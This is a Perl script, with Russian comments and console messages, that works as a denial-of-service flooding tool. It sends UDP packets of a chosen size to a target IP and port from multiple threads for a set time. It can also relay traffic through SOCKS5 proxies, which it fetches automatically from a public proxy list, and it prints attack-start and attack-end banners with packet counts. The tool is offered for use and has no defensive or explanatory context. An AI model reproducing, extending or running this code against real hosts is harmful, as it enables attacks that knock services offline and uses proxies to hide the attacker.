#!/usr/bin/perl

use strict;
use warnings;
use threads;
use threads::shared;
use IO::Socket;
use IO::Socket::INET;
use IO::Socket::Socks;
use LWP::Simple;
use Socket;
use Time::HiRes qw(gettimeofday tv_interval sleep);
use Sys::Info;

# Получаем количество ядер процессора
my $info = Sys::Info->new;
my $cpu = $info->device('CPU');
my $max_threads = $cpu->count || 4;

# Проверка аргументов
if (@ARGV < 7) {
    die "Использование: $0 <IP> <порт> <размер> <время> <udp/tcp/http> <основной/прокси/all> <файл_прокси> [потоки]\n";
}

# Получаем параметры
my ($ip, $port, $size, $time, $protocol, $attack_type, $proxy_file, $threads) = @ARGV;

# Проверяем корректность входных данных
die "Ошибка: Некорректный IP: $ip\n" unless $ip =~ /^(\d{1,3}\.){3}\d{1,3}$/;
die "Ошибка: Некорректный порт: $port\n" unless $port =~ /^\d+$/ && $port > 0 && $port <= 65535;
die "Ошибка: Некорректный размер пакета: $size\n" unless $size =~ /^\d+$/ && $size >= 64 && $size <= 65507;
die "Ошибка: Некорректное время: $time\n" unless $time =~ /^\d+$/ && $time > 0;
die "Ошибка: Укажите протокол (udp/tcp/http)\n" unless $protocol =~ /^(udp|tcp|http)$/i;
die "Ошибка: Укажите тип атаки (основной/прокси/all)\n" unless $attack_type =~ /^(основной|прокси|all)$/i;

# Проверка потоков
if (defined $threads) {
    die "Ошибка: Некорректное количество потоков\n" unless $threads =~ /^\d+$/ && $threads > 0;
    if ($threads > $max_threads) {
        print "⚠️  Указано $threads потоков, но доступно $max_threads. Используем $max_threads.\n";
        $threads = $max_threads;
    }
} else {
    print "🔹 Потоки не указаны. Используем максимум: $max_threads\n";
    $threads = $max_threads;
}

# Загружаем прокси
my @proxies;
if ($attack_type =~ /^(прокси|all)$/i) {
    if (-e $proxy_file) {
        open my $fh, '<', $proxy_file or die "Ошибка: Не удалось открыть файл прокси: $proxy_file\n";
        @proxies = <$fh>;
        chomp(@proxies);
        close $fh;
    }
    # Если файл пуст, загружаем прокси из интернета
    if (!@proxies) {
        print "⏳ Загружаем свежие прокси...\n";
        my $proxy_data = get("https://www.proxy-list.download/api/v1/get?type=socks5") || "";
        @proxies = split /\n/, $proxy_data;
        die "Ошибка: Не удалось получить прокси из интернета!\n" unless @proxies;
        print "✅ Загружено " . scalar(@proxies) . " прокси.\n";
    }
}

# Глобальный счётчик пакетов
my $total_packets :shared = 0;

# Вывод информации
print "\n=== [ НАЧАЛО АТАКИ ] ===\n";
print " Цель: $ip:$port\n";
print " Протокол: " . uc($protocol) . "\n";
print " Размер пакета: $size байт\n";
print " Время: $time секунд\n";
print " Потоки: $threads\n";
print " Тип атаки: " . ($attack_type eq "основной" ? "С основного IP" : $attack_type eq "прокси" ? "Через прокси ($proxy_file)" : "С основного IP + Прокси ($proxy_file)") . "\n\n";

# Подготовка пакета
my $packet = "X" x $size;
my $endtime = time() + $time;

# Запуск потоков
my @threads;

sub attack_machine {
    socket(my $socket, PF_INET, SOCK_DGRAM, 0) or die "Ошибка: Не удалось создать сокет: $!\n";
    setsockopt($socket, SOL_SOCKET, SO_SNDBUF, 65507);
    my $sockaddr = pack_sockaddr_in($port, inet_aton($ip));

    while (time() <= $endtime) {
        send($socket, $packet, 0, $sockaddr);
        { lock($total_packets); $total_packets++; }
        print "📤 Отправлено: $total_packets пакетов ($ip:$port)\n";
    }
}

sub attack_proxy {
    while (time() <= $endtime) {
        my $proxy = $proxies[rand @proxies];
        my ($proxy_ip, $proxy_port) = split /:/, $proxy;
        my $socket = IO::Socket::Socks->new(
            ProxyAddr => $proxy_ip,
            ProxyPort => $proxy_port,
            ConnectAddr => $ip,
            ConnectPort => $port,
            SocksVersion => 5,
            Timeout => 5
        );
        if ($socket) {
            print $socket $packet;
            close($socket);
            { lock($total_packets); $total_packets++; }
            print "📤 Прокси $proxy отправил пакет.\n";
        }
    }
}

for my $i (1 .. $threads) {
    if ($attack_type eq "основной" || $attack_type eq "all") {
        push @threads, threads->create(\&attack_machine);
    }
    if ($attack_type eq "прокси" || $attack_type eq "all") {
        push @threads, threads->create(\&attack_proxy);
    }
}

$_->join() for @threads;

print "\n=== [ АТАКА ЗАВЕРШЕНА ] ===\n";
print "Всего отправлено пакетов: $total_packets ($ip:$port)\n";
